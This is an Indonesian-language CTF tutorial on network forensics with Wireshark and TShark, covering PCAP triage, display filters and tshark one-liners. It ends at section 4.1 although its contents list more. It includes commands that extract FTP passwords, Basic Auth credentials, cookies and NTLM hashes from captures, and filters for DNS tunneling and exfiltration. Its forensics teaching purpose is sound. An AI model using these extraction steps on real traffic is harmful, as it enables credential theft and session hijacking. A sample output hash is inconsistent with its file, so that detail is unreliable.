---
id: "57"
title: "🏛️ Bagian 0: Fondasi PCAP Analysis"
category: "7. Cryptography & Forensics"
categoryId: "crypto_forensics"
filename: "57_pcap_analysis_workflow.md"
refs_out: ["05","28","55","56","58"]
refs_in: ["55","56","58","62","64"]
---

> **Target Environment:** Parrot OS XFCE (Debian-based)  
> **Prerequisites:** Memahami dasar Linux CLI, konsep dasar IP/TCP/UDP, dan inspeksi file dasar (referensi: `[🧭 BAGIAN 0: FONDASI FORENSICS](/docs/forensics)`).  
> **Fokus Utama:** Network Forensics tingkat lanjut untuk CTF (HackTheBox, TryHackMe, PicoCTF) dan investigasi insiden tanpa ketergantungan pada browsing manual.

---

## 📑 Daftar Isi

1. [Bagian 0: Fondasi PCAP Analysis](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-0-fondasi-pcap-analysis)
2. [Bagian 1: Triage Cepat PCAP](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-1-triage-cepat-pcap)
3. [Bagian 2: Wireshark Display Filter & GUI Workflow](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-2-wireshark-workflow)
4. [Bagian 3: TShark CLI Workflow](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-3-tshark-cli-workflow)
5. [Bagian 4: Analisis Protokol Spesifik & Evasion](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-4-analisis-protokol-spesifik)
6. [Bagian 5: Credential Hunting & Hash Extraction](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-5-credential-hunting)
7. [Bagian 6: Rekonstruksi & File Recovery](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-6-rekonstruksi--file-recovery)
8. [Bagian 7: Detection Patterns (Scans, C2, Exfiltration)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-7-detection-patterns)
9. [Bagian 8: Analisis Tingkat Lanjut dengan Python Scapy](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-8-analisis-tingkat-lanjut-dengan-python-scapy)
10. [Bagian 9: 12 Common CTF PCAP Patterns](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-9-12-common-ctf-pcap-patterns)
11. [Bagian 10: Master PCAP Decision Tree](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-10-master-pcap-decision-tree)
12. [Bagian 11: Automation Script (pcap_triage.sh)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-11-automation-script)
13. [Bagian 12: Troubleshooting & Error Handling](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-12-troubleshooting--error-handling)
14. [Bagian 13: Cheatsheet Copy-Paste Ready](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-13-cheatsheet-copy-paste-ready)

---

## 🏛️ Bagian 0: Fondasi PCAP Analysis

### 0.1 Apa itu PCAP & Perannya di CTF

PCAP (_Packet Capture_) adalah rekaman biner langsung dari seluruh lalu lintas data yang melintasi antarmuka jaringan (_network interface card_).

> **Analogi Operasional:**  
> Jika log sistem (syslog, auth.log) adalah buku tamu hotel yang hanya mencatat siapa yang check-in, maka **PCAP adalah rekaman CCTV audio-visual 4K tanpa jeda**: setiap percakapan, file yang dikirim, klik tombol, hingga kata sandi yang diketik terekam persis seperti saat peristiwa terjadi.

> 💡 **ANALOGI PEMBACAAN PAKET UNTUK PEMULA:**  
> Setiap baris di Wireshark adalah satu "paket" — bayangkan seperti satu **amplop surat** yang berisi:  
> - **Dari siapa:** IP Source (`ip.src`)  
> - **Ke siapa:** IP Destination (`ip.dst`)  
> - **Lewat jalan mana:** Protocol (`TCP` / `UDP`)  
> - **Nomor pintu:** Port (`80`, `443`, `21`)  
> - **Isi suratnya:** Payload / Data (`http.file_data`, `Raw.load`)  
>  
> Saat kita melakukan **Follow TCP Stream**, kita mengumpulkan semua amplop dari percakapan yang sama dan menyusunnya berurutan seperti **membaca riwayat chat WhatsApp** dari awal sampai akhir!

#### Format Kontainer PCAP:

- **`.pcap` (Legacy libpcap):** Format capture standar generasi awal. Memiliki struktur header global sederhana (24 bytes) diikuti header paket per frame (16 bytes). Kelemahan: tidak dapat mencatat metadata interface jamak atau komentar per-paket.
- **`.pcapng` (PCAP Next Generation):** Berbasis blok dinamis (_Section Header Block_, _Interface Description Block_, _Enhanced Packet Block_). Mendukung penangkapan dari beberapa antarmuka jaringan sekaligus, resolusi stempel waktu nanodetik, resolusi nama host lokal, dan injeksi komentar langsung pada paket tertentu.
- **`.cap`:** Ekstensi generik yang sering digunakan oleh utility capture proprietary (misal: format pcap lawas atau capture WiFi 802.11 monitor mode).

#### Vektor Temuan di CTF:

1. **Plaintext Credentials:** Kredensial akun yang dikirimkan melalui protokol usang (HTTP, FTP, Telnet, POP3, IMAP, SMTP, LDAP).
2. **Cryptographic Hashes:** NTLMv1/v2 SSP handshakes, Kerberos TGS/AS-REP requests, WPA2 4-Way Handshakes (EAPOL).
3. **Covert Channels & Exfiltration:** DNS tunneling (data terenkode di sub-domain), ICMP echo request data stuffing, TCP Window/Initial Sequence Number (ISN) covert encoding.
4. **Malware Artifacts & C2 Communication:** File binary payload (EXE, ELF, DLL), Powershell dropper, transmisi heartbeat/beacon C2 framework (Cobalt Strike, Mythic, Sliver).
5. **Flags:** Tersebar di dalam HTTP body, chunked data stream, email body/attachment, SMB file shares, atau field kustom protokol proprietary.

---

### 0.2 Tabel Protokol Target

|Protokol|Port Standar|Vektor Artefak / Yang Dicari|Filter Wireshark / TShark|
|---|---|---|---|
|**HTTP**|80, 8080|URI requests, Form POST, Cookies, API Keys, File Transfer|`http`|
|**HTTPS/TLS**|443, 8443|SNI (Server Name), Identitas Sertifikat X.509, JA3 Fingerprints|`tls`|
|**FTP**|21 (Data: 20)|User/Pass plaintext, command transfer file (`RETR`, `STOR`)|`ftp|
|**DNS**|53 (UDP/TCP)|Subdomain query anomali (Tunneling/Exfiltration), TXT records|`dns`|
|**SMTP**|25, 587|Header email, Autentikasi Base64, attachment MIME file|`smtp`|
|**Telnet**|23|Sesi interaktif terminal tanpa enkripsi (per-keystroke)|`telnet`|
|**SMB / CIFS**|445, 139|NTLMSSP challenge-response hash, Tree Connect, file recovery|`smb2`|
|**SSH**|22|Negosiasi versi banner client/server (tidak bisa di-decrypt)|`ssh`|
|**ICMP**|N/A|Data field di luar default ping padding (ekfiltrasi biner)|`icmp`|
|**HTTP/2**|443, 80|Multiplexed stream frames (HEADERS, DATA), request pseudo-headers|`http2`|
|**POP3**|110 (995 SSL)|Autentikasi `USER`/`PASS`, pesan email masuk|`pop`|
|**IMAP**|143 (993 SSL)|Perintah `LOGIN`, sinkronisasi folder mailbox|`imap`|
|**SNMP**|161, 162|Plaintext Community Strings (`public`/`private`), System OIDs|`snmp`|
|**Kerberos**|88|TGS-REQ / AS-REP hashes (Roasting artifacts di CTF)|`kerberos`|
|**DHCP / BOOTP**|67, 68|Hostname discovery, gateway, DNS servers assignment|`bootp`|
|**IRC**|6667|Komunikasi chat botnet, plaintext commands|`irc`|
|**TFTP**|69 (UDP)|Firmware transfer, file konfigurasi tanpa otentikasi|`tftp`|

---

### 0.3 Setup Environment Parrot OS

Jalankan instalasi dependensi berikut untuk memastikan workstation siap menangani seluruh skenario capture jaringan:

Bash

```
# 1. Update repository
sudo apt update -y

# 2. Instal toolkit network analysis utama
sudo apt install -y wireshark tshark tcpdump ngrep tcpflow zeek scapy \
                    python3-scapy mono-complete wine

# 3. Setup non-root capturing privileges untuk tshark & wireshark
sudo dpkg-reconfigure wireshark-common
# (Pilih <Yes> saat muncul dialog "Should non-superusers be able to capture packets?")
sudo usermod -aG wireshark $USER

# 4. Instal NetworkMiner (Menggunakan direct zip link)
wget "https://www.netresec.com/files/NetworkMiner_2-9.zip" -O /tmp/networkminer.zip
sudo mkdir -p /opt/networkminer
sudo unzip -q /tmp/networkminer.zip -d /opt/networkminer/
sudo chmod +x /opt/networkminer/NetworkMiner.exe
sudo ln -sf /opt/networkminer/NetworkMiner.exe /usr/local/bin/networkminer

# Wrapper script untuk menjalankan NetworkMiner
cat << 'EOF' | sudo tee /usr/local/bin/run-networkminer > /dev/null
#!/bin/bash
mono /opt/networkminer/NetworkMiner.exe "$@" &
EOF
sudo chmod +x /usr/local/bin/run-networkminer

# Catatan Alternatif CLI: Zeek (Analisis otomatis menghasilkan log terstruktur)
# zeek -r target.pcap -> Menghasilkan http.log, dns.log, files.log, conn.log
```

---

## ⚡ Bagian 1: Triage Cepat PCAP

### 1.1 5 Perintah Wajib Pertama

Saat menerima file PCAP yang belum diketahui isinya, jangan langsung membukanya di Wireshark. Jalankan 5 tahapan triage berbasis command-line berikut untuk memetakan cakupan insiden secara terukur:

text

```
[File PCAP Masuk]
       │
       ├─► 1. capinfos ...................... [Metadata & Durasi Capture]
       ├─► 2. tshark -z io,phs .............. [Distribusi Hierarki Protokol]
       ├─► 3. tshark -z conv,ip ............. [Daftar Interaksi IP (Top Talkers)]
       ├─► 4. ngrep / strings ............... [Pencarian Cepat Pola Flag]
       └─► 5. tshark -z expert .............. [Deteksi Anomali / Malformed Packets]
```

#### Command 1: Cek Metadata & Integritas File (`capinfos`)

Bash

```
capinfos target.pcap
```

_Contoh Output Nyata:_

text

```
File name:           target.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
Packet size limit:   file default 65535 bytes
Number of packets:   14,290
File size:           8,412,980 bytes
Data size:           8,184,340 bytes
Capture duration:    234.120938 seconds
Start time:          Wed Oct 18 10:14:02 2023
End time:            Wed Oct 18 10:17:56 2023
Data rate:           34,957 bytes/s
Data bit rate:       279,661 bits/s
Average packet size: 572.71 bytes
Average packet rate: 61.03 packets/s
SHA256:              e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

_Interpretasi:_ Periksa durasi capture dan _packet count_. Jika capture duration sangat singkat (<5 detik) tetapi memiliki puluhan ribu paket, indikasi kuat terjadinya Network Scan (SYN Flood/Port Scan). Periksa juga `Packet size limit`: jika nilainya terpotong (_snaplen_ kecil, misal 68 atau 96 bytes), payload aplikasi telah dipotong saat capture.

---

#### Command 2: Protocol Hierarchy Statistics (`tshark -q -z io,phs`)

Bash

```
tshark -r target.pcap -q -z io,phs
```

_Contoh Output Nyata:_

text

```
===================================================================
Protocol Hierarchy Statistics
Filter: 

eth                                      frames:14290 bytes:8412980
  ip                                     frames:14290 bytes:8412980
    tcp                                  frames:12100 bytes:7840120
      http                               frames:240   bytes:412030
        data-text-lines                  frames:40    bytes:8120
        image-png                        frames:12    bytes:350110
      tls                                frames:9800  bytes:6910240
    udp                                  frames:1890  bytes:452860
      dns                                frames:1850  bytes:442120
    icmp                                 frames:300   bytes:120000
      data                               frames:300   bytes:120000
===================================================================
```

_Interpretasi:_ Output ini langsung menentukan prioritas analisis:

- `http` (240 frame, ada transfer `image-png`): Periksa file transfer pada HTTP.
- `dns` (1850 frame): Rasio DNS sangat tinggi dibandingkan HTTP normal →→ **Indikator kuat DNS Tunneling / Exfiltration**.
- `icmp` (300 frame dengan sub-layer `data`): **Indikator covert channel ICMP payload**.

---

#### Command 3: Conversation Statistics (`tshark -q -z conv,ip`)

Bash

```
tshark -r target.pcap -q -z conv,ip
```

_Contoh Output Nyata:_

text

```
================================================================================
IPv4 Conversations
Filter:<No Filter>
                                             |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
                                             | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
192.168.1.105        <-> 10.0.0.53              925    221060     925    221060    1850    442120     0.120300000       230.1245
192.168.1.105        <-> 192.168.1.1              12      840       12       840      24      1680     1.450200000         0.0540
192.168.1.105        <-> 185.199.108.153        4800  3400120     5000   3510120    9800   6910240     5.120300000       120.4500
================================================================================
```

_Interpretasi:_

- `192.168.1.105` adalah host internal (_victim_ atau _attacker agent_).
- Komunikasi intensif ke `10.0.0.53` (1850 frame DNS) mengonfirmasi transmisi DNS berkelanjutan.
- IP `185.199.108.153` menyerap mayoritas bandwidth via HTTPS/TLS.

---

#### Command 4: Quick String & Flag Extraction

Bash

```
# Pencarian flag langsung pada layer aplikasi tanpa parsing mendalam
tshark -r target.pcap -Y 'frame contains "flag" || frame contains "FLAG" || frame contains "CTF{"' \
       -T fields -e ip.src -e ip.dst -e frame.number -e text
```

_Contoh Output Nyata:_

text

```
192.168.1.105    192.168.1.200    142    GET /secret_api?token=flag{quick_triage_win} HTTP/1.1\r\n
```

_Interpretasi:_ Jika flag langsung muncul pada tahap ini, challenge selesai dalam hitungan detik. Jika tidak ditemukan, lanjutkan ke inspeksi struktural.

---

#### Command 5: Expert Info Analysis (`tshark -q -z expert`)

Bash

```
tshark -r target.pcap -q -z expert
```

_Contoh Output Nyata:_

text

```
===============================================================================
Expert Info
Group      Severity  Summary                                           Count
Warn       Warning   TCP Out-of-Order                                     14
Warn       Warning   Connection reset (RST)                              342
Chat       Chat      HTTP/1.1 200 OK                                      24
Chat       Chat      Connection establish request (SYN): server port 80  120
Error      Error     Malformed Packet (Exception occurred)                 2
===============================================================================
```

_Interpretasi:_

- Tingginya _Connection reset (RST)_ bersamaan dengan _SYN request_: Indikasi Port Scanning aktif (banyak port target yang tertutup merespons dengan RST).
- _Malformed Packet_: Kemungkinan adanya eksploitasi buffer overflow berbasis jaringan atau custom protocol packet craft yang sengaja dirusak.

---

### 1.2 Identifikasi Jalur Analisis

Berdasarkan hasil pembacaan hierarki protokol, tentukan workflow berikut:

text

```
          HASIL PROTOCOL HIERARCHY
                     │
    ┌────────────────┼────────────────┬────────────────┐
    ▼                ▼                ▼                ▼
 [ HTTP/Web ]    [ High DNS ]     [ SMB/NetBIOS ]  [ Pure Raw TCP ]
    │                │                │                │
    ▼                ▼                ▼                ▼
Ekspor objek,    Ekstraksi query, Ekspor file,     Analisis port,
cek Form POST,   deteksi string   ekstraksi hash   rekonstruksi
cek auth header  panjang/base32   NTLMSSP          raw payload
```

1. **Dominan HTTP:** Jalur Web Forensics. Fokus pada ekspor file, analisis HTTP POST request, payload transfer form, dan header session.
2. **DNS Tidak Wajar (>500 query ke base domain sama):** Jalur DNS Tunneling. Ekstraksi subdomain label dan decode biner/hex/base32.
3. **Hadir Protokol SMB / SMB2:** Jalur File Sharing & Kredensial Internal. Ekstraksi transfer dokumen kantor, executable, dan handshake hash NTLM.
4. **Terdapat TLS bersamaan dengan Port Plaintext (HTTP/FTP):** Prioritaskan protokol plaintext terlebih dahulu. Jangan habiskan waktu mencoba mendekripsi TLS sebelum memeriksa apakah ada kunci dekripsi yang disisipkan di dalam capture.
5. **Traffic Port Non-Standar (Misal: Port 4444, 1337, 31337):** Jalur Reverse Shell / Raw TCP C2. Ikuti (_follow_) TCP stream secara langsung.

---

## 🦈 Bagian 2: Wireshark Workflow

### 2.1 Display Filter Reference

Display filter memfilter tampilan paket yang sedang dirender oleh Wireshark tanpa membuang data dari memori.

|Filter Syntax|Fungsi Operasional|Skenario Penggunaan CTF|
|---|---|---|
|`http.request.method == "POST"`|Isolasi seluruh request HTTP POST|Mencari input password form login, unggahan file|
|`http.response.code >= 400`|Filter respons error HTTP (4xx, 5xx)|Deteksi fuzzing direktori / web attack scanning|
|`http.request.uri contains "admin"`|Cari request dengan kata "admin" pada URL|Menemukan akses panel administratif|
|`frame contains "flag{"`|Full payload string search (Case sensitive)|Menemukan teks flag di sembarang layer|
|`frame matches "(?i)flag\{[a-z0-9_]+\}"`|Regular expression search (Insensitive)|Pola flag dengan karakter fleksibel|
|`tcp.flags.reset == 1 && tcp.seq == 1`|Filter paket TCP RST tunggal|Scanning footprinting identification|
|`tcp.stream eq 4`|Tampilkan seluruh paket dalam koneksi TCP ke-4|Mengisolasi interaksi satu sesi secara utuh|
|`tcp.analysis.retransmission`|Identifikasi paket yang dikirim ulang|Analisis instabilitas koneksi atau flooding|
|`ftp.request.command == "USER"`|Tampilkan percobaan input username FTP|Identifikasi percobaan login FTP|
|`ftp.request.command == "PASS"`|Tampilkan transmisi password FTP|Ekstraksi credential plaintext FTP|
|`ftp-data`|Isolasi data transfer aktif FTP|Ekstraksi file gambar/arsip/dokumen via FTP|
|`telnet`|Filter sesi terminal Telnet|Mengambil perintah bash yang dieksekusi|
|`dns.flags.response == 0`|Hanya tampilkan DNS Queries (Request)|Menghitung volume request exfiltration|
|`dns.qry.name.len > 50`|Filter DNS dengan panjang nama query >50|**Deteksi anomali DNS Exfiltration / Tunneling**|
|`dns.qry.type == 16`|Filter DNS Query tipe TXT|C2 payload return data channel|
|`icmp.type == 8`|Hanya tampilkan ICMP Echo Request (Ping)|Memeriksa payload yang disuntikkan penyerang|
|`icmp.data_len > 32`|Filter ICMP dengan ukuran payload tidak wajar|Deteksi covert channel ICMP data tunneling|
|`smtp.req.command == "DATA"`|Saring inisialisasi pengiriman konten email|Mengambil isi surat dan file attachment|
|`smb2.cmd == 5`|SMB2 Create Request (Buka / Buat File)|Mengidentifikasi file apa yang diakses korban|
|`smb2.filename contains ".exe"`|Filter transfer file executable via SMB|Mendeteksi malware lateral movement|
|`ntlmssp.messagetype == 3`|Filter paket NTLM Authenticate Message|Ekstraksi NetNTLMv2 hash untuk cracking|
|`ip.src == 192.168.1.0/24`|Filter subnet sumber tertentu|Mempersempit analisis pada subnet lokal|
|`ip.addr != 10.0.0.1`|Eliminasi IP tertentu dari tampilan|Menghilangkan noise dari IP gateway/DNS server|
|`ssh.protocol`|Filter paket negosiasi versi protokol SSH|Ekstraksi banner client/server software|
|`tls.handshake.type == 1`|Filter paket TLS Client Hello|Menangkap nilai SNI (_Server Name Indication_)|
|`tls.handshake.extension.type == 0`|Ekstrak ekstensi SNI secara eksplisit|Mendeteksi domain target pada traffic terenkripsi|
|`kerberos.CNameString`|Nama akun user pada autentikasi Kerberos|User enumeration pada domain Active Directory|
|`snmp.community`|String community SNMP|Ekstraksi community string SNMP plaintext|
|`tftp.opcode == 1`|TFTP Read Request (Download)|Rekonstruksi transfer firmware/file rahasia|
|`data.len > 0 && !tcp && !udp`|Raw payload di luar protokol standar|Deteksi komunikasi layer 3 kustom / covert channel|

---

### 2.2 Sesi "Follow Stream"

Follow Stream merekonstruksi byte TCP/UDP stream kembali ke format aliran komunikasi aslinya:

- **TCP Stream:** Menyatukan segmen TCP secara berurutan berdasarkan nomor _Sequence_ dan _Acknowledgment_, menangani fragmentasi paket, dan menampilkan payload stream dalam format visual dua arah:
    - **Teks Merah:** Data yang dikirim dari Client ke Server.
    - **Teks Biru:** Data yang dikirim dari Server ke Client.
- **UDP Stream:** Mengelompokkan paket UDP antara dua endpoint IP dan port yang sama (cocok untuk follow query DNS atau traffic TFTP).
- **TLS Stream:** Hanya dapat direkonstruksi jika kunci enkripsi (_Pre-Master Secret Log_) disediakan.

#### Prosedur Ekstraksi Stream:

1. Klik kanan pada paket target di daftar paket Wireshark.
2. Pilih **Follow** →→ **TCP Stream** (atau **HTTP Stream**).
3. Di jendela pop-up:
    - Ubah dropdown di kiri bawah (_Entire conversation_) jika hanya ingin melihat data satu arah (_Client →→ Server_ atau sebaliknya).
    - Ubah radio button tampilan di kanan bawah:
        - `ASCII`: Untuk membaca teks biasa, request web, kredensial.
        - `Raw`: **Wajib dipilih** jika stream berisi file binary (ZIP, EXE, PNG) untuk mencegah korupsi format byte.
4. Klik tombol **Save as...** untuk menyimpan data ke disk:
    - Jika mode `Raw` aktif, file tersimpan murni sebagai file binary yang dapat langsung diperiksa dengan utility `file` atau `binwalk`.

---

### 2.3 Export Objects (Ekstraksi File Otomatis)

Wireshark memiliki engine reassembly otomatis untuk merekonstruksi file utuh dari berbagai protokol transfer:

#### Melalui Menu GUI:

- **HTTP:** `File` →→ `Export Objects` →→ `HTTP...`  
    Menampilkan daftar file gambar, berkas PHP, script JS, archive ZIP yang lewat di stream HTTP. Pilih file yang diinginkan lalu klik **Save**.
- **SMB / SMB2:** `File` →→ `Export Objects` →→ `SMB...`  
    Merekam file dokumen (DOCX, PDF), script binary (BAT, PS1, EXE) yang disalin melalui share folder Windows.
- **FTP-DATA, TFTP, IMF (Email):** Tersedia pada submenu yang sama jika capture mengandung transfer file dari protokol tersebut.

#### Verifikasi Integritas File Hasil Ekspor:

Setelah file diekspor ke direktori kerja, lakukan validasi format dan checksum:

Bash

```
# Validasi tipe file asli (mendeteksi ekstensi palsu)
file exported_file.bin

# Hitung cryptographic hash
sha256sum exported_file.bin
```

---

## 💻 Bagian 3: TShark CLI Workflow

### 3.1 Keunggulan TShark vs Wireshark di CTF

- **Headless:** Bekerja optimal di terminal Parrot OS tanpa memerlukan server visual X11/GUI.
- **Scriptable & Pipeable:** Output tshark dapat langsung diproses (_pipe_) ke `grep`, `awk`, `sed`, `sort`, `uniq`, `base64`, atau custom script Python.
- **Resource Efficient:** Mampu memproses file pcap berukuran gigabyte tanpa mengalami memory crash seperti yang sering terjadi pada Wireshark GUI.

### 3.2 Anatomi Sintaks TShark

Bash

```
tshark -r <file.pcap> -Y <display_filter> -T fields -e <field_name> [options]
```

- `-r <file>`: Menentukan path file input pcap/pcapng.
- `-Y <filter>`: Menerapkan **Display Filter** (sintaks identik 100% dengan filter Wireshark).
- `-T fields`: Mengubah output tshark menjadi format kolom data tabular (bukan ringkasan paket teks standar).
- `-e <field>`: Menentukan field protokol spesifik yang ingin diekstrak (dapat digunakan berulang kali: `-e ip.src -e ip.dst`).
- `-E separator=,`: Menentukan karakter pemisah antar kolom (misal: koma, tab, pipe).
- `-q`: Mode hening (_quiet_), menonaktifkan penghitung paket progresif (wajib saat generate statistik `-z`).
- `-z <stats>`: Menjalankan modul analisis statistik built-in (misal: `-z io,phs`, `-z conv,ip`, `-z expert`).
- `-w <output.pcap>`: Menyimpan paket hasil filter ke dalam file PCAP baru.
- `--export-objects <protocol>,<dest_dir>`: Otomasi ekstraksi file via CLI.

---

### 3.3 20+ Essential TShark One-Liners

Jalankan perintah-perintah berikut langsung di terminal Parrot OS:

Bash

```
# 1. Ekstrak seluruh Hostname dan URI dari request HTTP (Pemetaan Web Traffic)
tshark -r target.pcap -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.method -e http.request.uri

# 2. Ekstrak data mentah HTTP POST (Pencarian Form Payload & Kredensial)
tshark -r target.pcap -Y 'http.request.method == "POST"' -T fields -e ip.src -e http.request.uri -e http.file_data

# 3. Ekstrak seluruh User-Agent unik yang ada di capture (Identifikasi OS/Tooling Attacker)
tshark -r target.pcap -Y 'http.user_agent' -T fields -e http.user_agent | sort -u

# 4. Ekstrak seluruh DNS Queries unik (Mencari domain anomali)
tshark -r target.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | sort -u

# 5. Deteksi indikasi DNS Tunneling (Mencari panjang nama query > 50 karakter)
tshark -r target.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | awk 'length($1) > 50' | sort -u

# 6. Ekstrak kredensial plaintext login FTP
tshark -r target.pcap -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

# 7. Ekstrak list nama file yang ditransfer melalui FTP
tshark -r target.pcap -Y 'ftp.request.command == "RETR" || ftp.request.command == "STOR"' -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

# 8. Ekstrak subjek dan alamat pengirim seluruh email (SMTP)
tshark -r target.pcap -Y 'smtp' -T fields -e smtp.req.parameter | grep -iE "FROM:|TO:|Subject:"

# 9. Ekspor seluruh objek HTTP langsung dari command line (Otomatisasi tanpa GUI)
mkdir -p extracted_http && tshark -r target.pcap --export-objects "http,extracted_http" -q

# 10. Ekspor seluruh file SMB langsung dari command line
mkdir -p extracted_smb && tshark -r target.pcap --export-objects "smb,extracted_smb" -q

# 11. Hitung jumlah paket per alamat IP (Menentukan Top Talkers / Attacker IP)
tshark -r target.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -n 10

# 12. Ekstrak seluruh payload ICMP dalam bentuk format heksadesimal
tshark -r target.pcap -Y 'icmp.type == 8 && data.len > 0' -T fields -e data.data

# 13. Deteksi Port Scan (Mencari paket TCP SYN tanpa ACK terkirim dari satu sumber)
tshark -r target.pcap -Y 'tcp.flags.syn == 1 && tcp.flags.ack == 0' -T fields -e ip.src -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn | head -n 20

# 14. Ekstrak nama share dan file path yang diakses pada SMB2
tshark -r target.pcap -Y 'smb2.cmd == 5' -T fields -e ip.src -e smb2.filename | awk 'NF' | sort -u

# 15. Ekstrak nilai Cookie HTTP untuk sesi hijacking / token identification
tshark -r target.pcap -Y 'http.cookie' -T fields -e ip.src -e http.cookie | sort -u

# 16. Cari header HTTP Authorization (Mencari Basic Auth Base64)
tshark -r target.pcap -Y 'http.authorization' -T fields -e ip.src -e http.authorization

# 17. Ekstrak SNI (Server Name Indication) dari handshake TLS
tshark -r target.pcap -Y 'tls.handshake.extension.type == 0' -T fields -e ip.dst -e tls.handshake.extensions_server_name | sort -u

# 18. Ekstrak Session ID / Key Parameter pada komunikasi Telnet
tshark -r target.pcap -Y 'telnet' -T fields -e telnet.data

# 19. Cari string flag di seluruh packet data payload dan tampilkan nomor frame
tshark -r target.pcap -Y 'frame contains "flag"' -T fields -e frame.number -e ip.src -e ip.dst

# 20. Konversi stream TCP tertentu langsung menjadi file biner di disk
# Cara cari nomor stream yang ada di PCAP:
tshark -r target.pcap -Y 'tcp' -T fields -e tcp.stream | sort -nu

# Ekstrak stream TCP index ke-0 sebagai binary:
tshark -r target.pcap -q -z "follow,tcp,raw,0" | \
  tail -n +7 | \   # Skip 7 baris header tshark
  head -n -1 | \   # Buang baris footer terakhir
  xxd -r -p \      # Konversi hex string -> binary
  > stream0_payload.bin

file stream0_payload.bin # Identifikasi jenis file hasil ekstraksi
```

---

### 3.4 Referensi Field Names TShark

Gunakan tabel referensi ini untuk menyusun custom extraction query menggunakan flag `-e`:

|Protokol|Field Name TShark|Contoh Nilai yang Dikembalikan|
|---|---|---|
|**Ethernet**|`eth.src` / `eth.dst`|`00:0c:29:84:5a:ab`|
|**IP**|`ip.src` / `ip.dst`|`192.168.1.105`|
|**IP**|`ip.ttl`|`64` (Linux default), `128` (Windows default)|
|**TCP**|`tcp.srcport` / `tcp.dstport`|`4444`, `80`|
|**TCP**|`tcp.stream`|`0`, `1`, `2` ...|
|**TCP**|`tcp.seq` / `tcp.ack`|`3829102482`|
|**TCP**|`tcp.flags`|`0x0002` (SYN), `0x0014` (RST-ACK)|
|**UDP**|`udp.srcport` / `udp.dstport`|`53`, `514`|
|**HTTP**|`http.request.method`|`GET`, `POST`, `PUT`|
|**HTTP**|`http.request.uri`|`/login.php?id=1`|
|**HTTP**|`http.file_data`|`user=admin&pass=secret123`|
|**HTTP**|`http.response.code`|`200`, `302`, `404`, `500`|
|**DNS**|`dns.qry.name`|`aW5mb3NlYw==.evil-domain.com`|
|**DNS**|`dns.qry.type`|`1` (A), `16` (TXT), `28` (AAAA)|
|**FTP**|`ftp.request.arg`|`anonymous`, `secretPass123`|
|**FTP**|`ftp.response.arg`|`User logged in, proceed.`|
|**ICMP**|`data.data`|`61626364656667...` (Hex bytes)|
|**SMB2**|`smb2.filename`|`Users\Administrator\Desktop\flag.txt`|
|**TLS**|`tls.handshake.extensions_server_name`|`api.target-host.local`|
|**Frame**|`frame.number`|`1452`|
|**Frame**|`frame.time_epoch`|`1697624102.124501`|

---

### 3.5 🐘 Cara Mengendalikan File PCAP Berukuran Besar (>100 MB)

Ketika diberikan file PCAP berukuran raksasa, Wireshark GUI bisa mengalami freeze/hang. Gunakan utilitas CLI (`tshark`, `editcap`) untuk memotong atau menyaring capture:

```bash
# 1. Filter & pecah PCAP hanya untuk protokol spesifik (misal: hanya HTTP traffic)
tshark -r huge_capture.pcap -Y 'http' -w http_only.pcap

# 2. Pecah PCAP berdasarkan rentang waktu spesifik (misal: 60 detik pertama)
editcap -A "2024-01-01 10:00:00" -B "2024-01-01 10:01:00" huge_capture.pcap first_minute.pcap

# 3. Ambil N paket pertama saja untuk sampling awal (misal: 1000 paket pertama)
editcap -r huge_capture.pcap sample_1k.pcap 1-1000

# 4. Hitung ukuran data per protokol untuk menentukan prioritas sebelum memotong
tshark -r huge_capture.pcap -q -z io,stat,0,"COUNT(frame)frame","BYTES(frame)frame"
```

---

## 🔬 Bagian 4: Analisis Protokol Spesifik

### 4.1 Analisis HTTP & Dekripsi HTTPS

#### Rekonstruksi Multipart Form Upload:

Ketika attacker mengunggah file webshell atau flag diunggah via form browser, data dikirim menggunakan Content-Type `multipart/form-data`:

Bash

```
# Ekstrak data boundary, header form, dan isi file
tshark -r target.pcap -Y 'http.request.method == "POST" && http.content_type contains "multipart"' \
       -T fields -e ip.dst -e http.file_data
```

#### Ekstraksi HTTP Basic Auth:

Header `Authorization: Basic <base64>` mengenkapsulasi format `username:password` secara transparan:

Bash

```
tshark -r target.pcap -Y 'http.authorization contains "Basic"' -T fields -e http.authorization | sort -u | while read -r auth; do
    raw_b64=$(echo "$auth" | awk '{print $2}')
    echo "[+] Raw: $auth -> Decoded: $(echo "$raw_b64" | base64 -d)"
done
```

#### Dekripsi HTTPS Melalui Pre-Master Secret Log:

Jika deskripsi challenge CTF menyediakan file teks `sslkeylog.txt` atau `keys.log`:

1. **Wireshark GUI:** Buka `Edit` →→ `Preferences` →→ `Protocols` →→ `TLS` →→ Isi kolom `(Pre)-Master-Secret log filename` dengan path file log tersebut.
2. **TShark CLI:**
    
    Bash
    
    ```
    tshark -r target.pcap -o "tls.keylog_file:sslkeylog.txt" -Y 'http' -T fields -e http.request.uri
    ```
    
